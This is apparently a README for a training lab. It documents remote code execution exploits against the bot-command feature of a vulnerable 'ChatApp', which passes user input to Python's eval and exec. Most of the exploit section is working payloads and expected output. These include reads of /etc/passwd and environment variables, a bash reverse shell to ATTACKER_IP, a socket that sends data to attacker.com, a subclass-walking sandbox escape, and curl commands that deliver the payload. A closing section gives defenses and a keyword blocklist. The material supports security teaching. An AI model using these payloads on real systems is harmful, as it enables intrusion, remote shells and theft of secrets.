# ChatApp - Remote Code Execution (RCE) Exploits

## Overview
These exploits target the ChatApp's bot command feature which unsafely evaluates user input using `eval()` and `exec()`.

## Target Application
- **Project**: ChatApp
- **Port**: 5006
- **Vulnerable Feature**: Bot commands (messages starting with `/bot`)
- **Vulnerability**: Unsafe Python code execution

## Prerequisites
```bash
# Ensure ChatApp is running
docker-compose up -d chatapp
curl http://localhost:5006
```

## Exploits

### 1. eval_bot_command.py
Exploits the `eval()` function in bot command processing.

**Usage:**
```bash
python3 eval_bot_command.py
```

**What it does:**
- Sends a message starting with `/bot` to trigger the bot
- Injects Python code that gets evaluated with `eval()`
- Executes arbitrary Python expressions
- Example: Reads sensitive files or environment variables

**Expected Output:**
```
[+] Connecting to ChatApp: http://localhost:5006
[+] Registering user: hacker
[+] Sending malicious bot command...
[+] Command: /bot __import__('os').popen('cat /etc/passwd').read()
[+] Bot response:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

**Payload Examples:**
```python
# Read files
/bot __import__('os').popen('cat /etc/passwd').read()

# Environment variables
/bot __import__('os').popen('env').read()

# Reverse shell
/bot __import__('os').system('bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"')

# Python code execution
/bot [x for x in ().__class__.__bases__[0].__subclasses__() if x.__name__ == 'Popen'][0](['whoami'],stdout=-1).communicate()[0]
```

### 2. exec_bot_command.py
Exploits the `exec()` function in bot command processing.

**Usage:**
```bash
python3 exec_bot_command.py
```

**What it does:**
- Similar to eval but uses `exec()` for statement execution
- Allows multi-line code execution
- Can define functions and classes
- More flexible than `eval()`

**Expected Output:**
```
[+] Connecting to ChatApp: http://localhost:5006
[+] Registering user: attacker
[+] Sending exec-based payload...
[+] Command: /bot import os; print(os.listdir('/'))
[+] Bot response:
['bin', 'boot', 'dev', 'etc', 'home', 'lib', ...]
```

**Advanced Payloads:**
```python
# Multi-statement execution
/bot import os; import sys; print(sys.version)

# File operations
/bot f=open('/etc/passwd','r'); print(f.read())

# Network operations
/bot import socket; s=socket.socket(); s.connect(('attacker.com',4444)); s.send(b'PWNED')
```

## Manual Testing

### Test via Web Interface:
1. Open http://localhost:5006
2. Register/login as any user
3. Send messages:
```
/bot __import__('os').popen('whoami').read()
/bot __import__('os').popen('id').read()
/bot __import__('os').popen('ls -la /').read()
```

### Test via curl:
```bash
# Register user
curl -X POST http://localhost:5006/register \
  -H "Content-Type: application/json" \
  -d '{"username":"hacker","password":"pass123"}'

# Login
curl -c cookies.txt -X POST http://localhost:5006/login \
  -H "Content-Type: application/json" \
  -d '{"username":"hacker","password":"pass123"}'

# Send bot command
curl -b cookies.txt -X POST http://localhost:5006/message \
  -H "Content-Type: application/json" \
  -d '{"message":"/bot __import__('\''os'\'').popen('\''cat /etc/passwd'\'').read()"}'
```

## Defense Recommendations

### 1. Remove eval/exec Completely
```python
# NEVER DO THIS:
def process_bot_command(msg):
    command = msg.replace('/bot ', '')
    return eval(command)  # DANGEROUS!

# DO THIS INSTEAD:
def process_bot_command(msg):
    command = msg.replace('/bot ', '').lower()
    
    # Whitelist approach
    commands = {
        'help': 'Available commands: help, time, weather',
        'time': get_current_time(),
        'weather': get_weather()
    }
    
    return commands.get(command, 'Unknown command')
```

### 2. Sandboxing (if dynamic execution required)
```python
import RestrictedPython

def safe_eval(code):
    compiled = compile_restricted(
        code,
        filename='<inline>',
        mode='eval'
    )
    
    # Minimal safe globals
    safe_globals = {
        '__builtins__': {
            'True': True,
            'False': False,
            'None': None,
        }
    }
    
    return eval(compiled, safe_globals, {})
```

### 3. Input Validation
```python
import re

def validate_bot_command(cmd):
    # Only allow alphanumeric and spaces
    if not re.match(r'^[a-zA-Z0-9\s]+$', cmd):
        raise ValueError("Invalid command")
    
    # Blacklist dangerous keywords
    dangerous = ['import', 'eval', 'exec', '__', 'open', 'file']
    if any(word in cmd.lower() for word in dangerous):
        raise ValueError("Dangerous command detected")
    
    return cmd
```

## Notes
**WARNING**: These vulnerabilities are CRITICAL
- `eval()` and `exec()` should NEVER be used on user input
- Can lead to complete system compromise
- Allows arbitrary code execution as the application user
- Can be used for lateral movement and privilege escalation

**Common Attack Scenarios:**
1. Initial Access: RCE via bot command
2. Persistence: Create cron jobs or modify startup scripts
3. Privilege Escalation: Exploit container or host vulnerabilities
4. Lateral Movement: Access other containers via Docker network
5. Data Exfiltration: Steal database contents, environment variables, secrets

## Related Exploits
- See `../sqli/` for database attacks
- See `../xss/` for client-side attacks
- Combine RCE with SQLi to extract database credentials
